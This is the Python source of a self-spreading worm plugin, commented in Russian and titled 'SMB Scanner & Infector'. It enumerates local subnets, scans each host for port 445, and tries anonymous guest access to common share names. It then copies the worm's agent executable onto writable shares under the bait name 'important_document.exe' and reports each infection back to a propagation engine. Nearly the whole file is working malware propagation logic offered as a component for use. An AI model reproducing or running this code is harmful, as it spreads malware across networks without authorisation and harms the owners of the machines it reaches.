# Worm Plugin: SMB Scanner & Infector

import platform
import logging
import os
import shutil
import time
import socket
import ipaddress
import subprocess
import threading
from smbclient import listdir, stat, ClientConfig, register_session, makedirs, remove, rmdir, symlink # Используем smbclient (форк pysmb)

from ..interfaces import PropagationPluginBase
from typing import TYPE_CHECKING, List, Optional

if TYPE_CHECKING:
    from ..propagation_engine import PropagationEngine

logger = logging.getLogger('WormSMBScanner')

class SMBScanner(PropagationPluginBase):

    def __init__(self, config: dict):
        super().__init__(config)
        self.payload_name = self.config.get("payload_name", "important_document.exe")
        self.scan_timeout = self.config.get("scan_timeout", 2) # Таймаут для сканирования порта 445
        self.target_subnet = self.config.get("target_subnet", None) # Можно указать конкретную подсеть CIDR
        self.share_names = self.config.get("share_names", ["public", "share", "files", "documents", "IPC$"]) # Популярные имена шар
        self.anonymous_only = self.config.get("anonymous_only", True) # Искать только анонимный доступ
        self.max_targets_per_run = self.config.get("max_targets", 10)
        self.lock = threading.Lock()
        self.last_run_time = 0
        self.check_interval = self.config.get("check_interval", 600) # Секунды

        # Настраиваем smbclient для анонимного доступа
        ClientConfig(username="guest", password="")

    def get_name(self) -> str:
        return "smb_scanner"

    def is_supported(self) -> bool:
        try:
            import smbclient
            # Дополнительно можно проверить доступность сетевых интерфейсов
            return True
        except ImportError:
            logger.warning("smbclient library not found ('pip install pysmbclient'), SMBScanner disabled.")
            return False

    def _get_local_subnets(self) -> List[str]:
        """Получает список локальных подсетей (IPv4)."""
        subnets = set()
        try:
            # Используем psutil, если доступен, для более надежного определения
            import psutil
            addrs = psutil.net_if_addrs()
            for interface_name, interface_addresses in addrs.items():
                for address in interface_addresses:
                    if str(address.family) == 'AddressFamily.AF_INET':
                        try:
                            ip_net = ipaddress.ip_network(f"{address.address}/{address.netmask}", strict=False)
                            if not ip_net.is_loopback and not ip_net.is_link_local:
                                subnets.add(str(ip_net))
                        except ValueError:
                            continue # Некорректная маска и т.п.
        except ImportError:
            # Fallback: получаем IP через socket
             hostname = socket.gethostname()
             try:
                 local_ip = socket.gethostbyname(hostname)
                 # Предполагаем стандартные маски /24 для класса C, /16 для B, /8 для A
                 if local_ip.startswith("192.168."):
                     subnets.add(f"{'.'.join(local_ip.split('.')[:3])}.0/24")
                 elif local_ip.startswith("172.") and 16 <= int(local_ip.split('.')[1]) <= 31:
                      subnets.add(f"{'.'.join(local_ip.split('.')[:2])}.0.0/16")
                 elif local_ip.startswith("10."):
                      subnets.add(f"10.0.0.0/8")
             except socket.gaierror:
                 logger.warning("Could not determine local IP address via socket.")

        return list(subnets)

    def _scan_host_for_smb(self, ip: str) -> bool:
        """Проверяет доступность порта 445 (SMB)."""
        try:
            with socket.create_connection((ip, 445), timeout=self.scan_timeout):
                return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        except Exception as e:
             logger.debug(f"Error scanning port 445 on {ip}: {e}")
             return False

    def _attempt_infection(self, ip: str, agent_path: str) -> Optional[str]:
        """Пытается найти открытую шару и скопировать агент."""
        target_server = f"\\\\{ip}"
        try:
            # Регистрация сессии (для анонимного доступа уже настроено через ClientConfig)
            # register_session(ip, username="guest", password="") # Не обязательно, если настроено глобально
            logger.debug(f"Attempting anonymous connection to {target_server}")

            # Пытаемся получить список шар (может не работать анонимно)
            # shares = listdir(target_server)
            # logger.debug(f"Shares found on {ip}: {shares}")
            # Пробуем подключиться к известным именам шар
            for share_name in self.share_names:
                target_share_path = f"{target_server}\\{share_name}"
                payload_dest_path = f"{target_share_path}\\{self.payload_name}"
                try:
                    # Проверяем доступность шары, пытаясь получить ее статус
                    stat(target_share_path)
                    logger.info(f"Found accessible share: {target_share_path}")

                    # Пытаемся скопировать файл
                    try:
                        # TODO: Проверить права на запись перед копированием?
                        # TODO: Использовать более надежный способ копирования, shutil не работает с UNC
                        # Попробуем через subprocess и 'copy'/'xcopy' (Windows) или 'smbclient' (Linux)
                        if platform.system() == "Windows":
                             # Простая команда copy, может потребовать \ в пути
                             win_dest_path = payload_dest_path.replace("/", "\\")
                             win_src_path = agent_path.replace("/", "\\")
                             cmd = ['cmd', '/c', 'copy', '/Y', win_src_path, win_dest_path]
                        else:
                             # Используем smbclient CLI (требует установки)
                             # smbclient //server/share -U user%password -c "put local_file remote_file"
                             # Анонимно: smbclient //server/share -N -c "put local_file remote_file"
                             # Экранируем путь к файлу и имя файла
                             remote_filename = self.payload_name.replace(" ", "?") # Простая замена пробелов
                             cmd = ['smbclient', f'//{ip}/{share_name}', '-N', '-c', f'put \"{agent_path}\" \"{remote_filename}\'']

                        logger.debug(f"Executing copy command: {' '.join(cmd)}")
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, check=False)

                        if result.returncode == 0:
                            logger.info(f"Successfully copied agent to {payload_dest_path}")
                            return target_share_path # Возвращаем путь к шаре как ID заражения
                        else:
                            logger.warning(f"Failed to copy agent to {payload_dest_path}. Error: {result.stderr or result.stdout}")
                            # Продолжаем пробовать другие шары
                    except FileNotFoundError:
                        logger.error(f"Copy command ({'copy' if platform.system() == 'Windows' else 'smbclient'}) not found.")
                        return None # Не можем копировать, прекращаем попытки для этого хоста
                    except subprocess.TimeoutExpired:
                        logger.warning(f"Copy command timed out for {payload_dest_path}")
                    except Exception as copy_err:
                        logger.error(f"Error copying agent to {payload_dest_path}: {copy_err}")

                except Exception as list_err:
                    # Ошибка доступа к шаре (нет прав, не существует и т.д.)
                    logger.debug(f"Could not access share {target_share_path}: {list_err}")
                    continue # Пробуем следующую шару

        except Exception as connect_err:
            logger.debug(f"Failed to connect anonymously to {target_server}: {connect_err}")

        return None # Не удалось заразить

    def run(self, engine: 'PropagationEngine'):
        with self.lock:
            current_time = time.time()
            if current_time - self.last_run_time < self.check_interval:
                logger.debug("SMB scan interval not yet passed.")
                return
            self.last_run_time = current_time

        logger.info("Running SMB network scan...")
        subnets_to_scan = [self.target_subnet] if self.target_subnet else self._get_local_subnets()
        if not subnets_to_scan:
            logger.warning("No subnets found to scan.")
            return

        targets_found = 0
        infected_count = 0

        for subnet_cidr in subnets_to_scan:
            if targets_found >= self.max_targets_per_run:
                 break
            logger.info(f"Scanning subnet: {subnet_cidr}")
            try:
                network = ipaddress.ip_network(subnet_cidr, strict=False)
                for ip_obj in network.hosts(): # Итерируемся по хостам в подсети
                    if targets_found >= self.max_targets_per_run:
                         break
                    if not engine.running: # Проверяем флаг остановки
                         return

                    ip_str = str(ip_obj)
                    target_id = f"smb:{ip_str}"

                    if not engine.should_attack(target_id):
                        logger.debug(f"Skipping already targeted host: {ip_str}")
                        continue

                    logger.debug(f"Scanning host {ip_str} for SMB port 445...")
                    if self._scan_host_for_smb(ip_str):
                        logger.info(f"Found potential SMB target: {ip_str}")
                        targets_found += 1
                        # Пытаемся заразить
                        infected_path = self._attempt_infection(ip_str, engine.agent_executable_path)
                        if infected_path:
                             engine.report_infection(target_id) # Сообщаем об успехе
                             infected_count += 1
                             # Переходим к следующему хосту после успешного заражения одного?
                             # break # Раскомментировать, чтобы атаковать только 1 хост за цикл сканирования
                    # Небольшая пауза между сканированием хостов
                    time.sleep(0.05)

            except ValueError as e:
                logger.error(f"Invalid subnet format: {subnet_cidr} - {e}")
            except Exception as e:
                logger.error(f"Error scanning subnet {subnet_cidr}: {e}")

        if infected_count > 0:
            logger.info(f"Successfully propagated to {infected_count} SMB shares in this cycle.")
        else:
            logger.debug("No new SMB shares infected in this cycle.") 